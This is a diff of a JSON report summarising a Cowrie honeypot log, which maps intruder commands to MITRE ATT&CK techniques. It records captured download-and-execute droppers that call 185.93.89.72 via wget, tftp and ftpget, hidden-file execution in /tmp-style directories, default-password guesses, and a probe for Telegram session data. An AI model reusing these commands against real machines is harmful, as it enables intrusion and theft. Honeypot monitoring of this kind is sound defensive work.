@@ -1,18 +1,18 @@
 {
   "log_file": "/home/cowrie/honeypot/var/log/cowrie/cowrie.json",
-  "generated": "2026-09-25 00:05:08",
+  "generated": "2026-09-25 01:00:52",
   "totals": {
-    "commands": 156,
-    "login_failed": 9,
-    "login_success": 12,
-    "sessions": 21
+    "commands": 222,
+    "login_failed": 15,
+    "login_success": 17,
+    "sessions": 94
   },
   "techniques": [
     {
       "id": "T1222.002",
       "name": "File and Directory Permissions Modification: Linux and Mac",
       "tactic": "Defense Evasion",
-      "count": 72,
+      "count": 99,
       "examples": [
         ">/var/.f && chmod 777 /var/.f && /var/.f && cd /var/;",
         ">/var/tmp/.f && chmod 777 /var/tmp/.f && /var/tmp/.f && cd /var/tmp/;",
@@ -21,65 +21,176 @@
         ">/dev/shm/.f && chmod 777 /dev/shm/.f && /dev/shm/.f && cd /dev/shm/;"
       ],
       "first": "2026-09-25T00:02:44.887220Z",
-      "last": "2026-09-25T00:03:16.300798Z",
-      "unique_ips": 1
+      "last": "2026-09-25T00:57:15.890211Z",
+      "unique_ips": 3
     },
     {
       "id": "T1078",
       "name": "Valid Accounts",
       "tactic": "Initial Access",
-      "count": 12,
+      "count": 17,
       "examples": [
-        "root / root"
+        "root / root",
+        "adm / adm",
+        "root / admin"
       ],
       "first": "2026-09-25T00:02:39.589537Z",
-      "last": "2026-09-25T00:03:13.577714Z",
-      "unique_ips": 1
+      "last": "2026-09-25T00:57:13.571579Z",
+      "unique_ips": 5
     },
     {
       "id": "T1110.001",
       "name": "Brute Force: Password Guessing",
       "tactic": "Credential Access",
-      "count": 9,
+      "count": 15,
       "examples": [
         "root / casa",
         "root / router",
         "root / hacker123",
-        "admin / admin"
+        "admin / admin",
+        "Admin / "
       ],
       "first": "2026-09-25T00:01:09.150965Z",
-      "last": "2026-09-25T00:03:08.367334Z",
-      "unique_ips": 2
+      "last": "2026-09-25T00:57:09.276470Z",
+      "unique_ips": 7
+    },
+    {
+      "id": "T1105",
+      "name": "Ingress Tool Transfer",
+      "tactic": "Command and Control",
+      "count": 3,
+      "examples": [
+        "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w",
+        "(tftp -g 185.93.89.72 -r tftp -l- || busybox tftp -g 185.93.89.72 -r tftp -l-) > t; chmod 777 t; ./t; rm -rf t",
+        "(ftpget 185.93.89.72 f ftpget || busybox ftpget 185.93.89.72 f ftpget) > f; chmod 777 f; ./f; rm -rf f"
+      ],
+      "first": "2026-09-25T00:20:41.496654Z",
+      "last": "2026-09-25T00:21:31.884423Z",
+      "unique_ips": 1
+    },
+    {
+      "id": "T1057",
+      "name": "Process Discovery",
+      "tactic": "Discovery",
+      "count": 2,
+      "examples": [
+        "ps | grep '[Mm]iner'",
+        "ps -ef | grep '[Mm]iner'"
+      ],
+      "first": "2026-09-25T00:11:44.099052Z",
+      "last": "2026-09-25T00:11:44.880079Z",
+      "unique_ips": 1
+    },
+    {
+      "id": "T1082",
+      "name": "System Information Discovery",
+      "tactic": "Discovery",
+      "count": 2,
+      "examples": [
+        "uname -a",
+        "cat /proc/cpuinfo"
+      ],
+      "first": "2026-09-25T00:11:42.471742Z",
+      "last": "2026-09-25T00:11:43.267480Z",
+      "unique_ips": 1
+    },
+    {
+      "id": "T1016",
+      "name": "System Network Configuration Discovery",
+      "tactic": "Discovery",
+      "count": 1,
+      "examples": [
+        "ifconfig"
+      ],
+      "first": "2026-09-25T00:11:41.675158Z",
+      "last": "2026-09-25T00:11:41.675158Z",
+      "unique_ips": 1
+    },
+    {
+      "id": "T1033",
+      "name": "System Owner/User Discovery",
+      "tactic": "Discovery",
+      "count": 1,
+      "examples": [
+        "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w"
+      ],
+      "first": "2026-09-25T00:20:41.496654Z",
+      "last": "2026-09-25T00:20:41.496654Z",
+      "unique_ips": 1
+    },
+    {
+      "id": "T1083",
+      "name": "File and Directory Discovery",
+      "tactic": "Discovery",
+      "count": 1,
+      "examples": [
+        "ls -la ~/.local/share/TelegramDesktop/tdata /home/*/.local/share/TelegramDesktop/tdata /dev/ttyGSM* /dev/ttyUSB-mod* /va"
+      ],
+      "first": "2026-09-25T00:11:45.662940Z",
+      "last": "2026-09-25T00:11:45.662940Z",
+      "unique_ips": 1
     }
   ],
   "unmapped": [
     [
       "/bin/busybox HISILICON",
-      18
+      21
     ],
     [
       "sh",
-      12
+      15
     ],
     [
       "shell",
-      12
+      15
     ],
     [
       "enable",
-      12
+      15
     ],
     [
       "system",
-      12
+      15
     ],
     [
       "ping; sh",
-      12
+      14
+    ],
+    [
+      "echo -e \"\\x47\\x41\\x59\\x46\\x47\\x54\"",
+      8
     ],
     [
       "/bin/busybox cat /proc/self/exe || cat /proc/self/exe",
-      6
+      7
+    ],
+    [
+      "/ip cloud print",
+      1
+    ],
+    [
+      "locate D877F783D5D3EF8Cs",
+      1
+    ],
+    [
+      "echo Hi | cat -n",
+      1
+    ],
+    [
+      "linuxshell",
+      1
+    ],
+    [
+      "enablelinuxshell",
+      1
+    ],
+    [
+      "ping ;sh",
+      1
+    ],
+    [
+      "cd /proc && cat self/cmdline",
+      1
     ]
   ]
 }
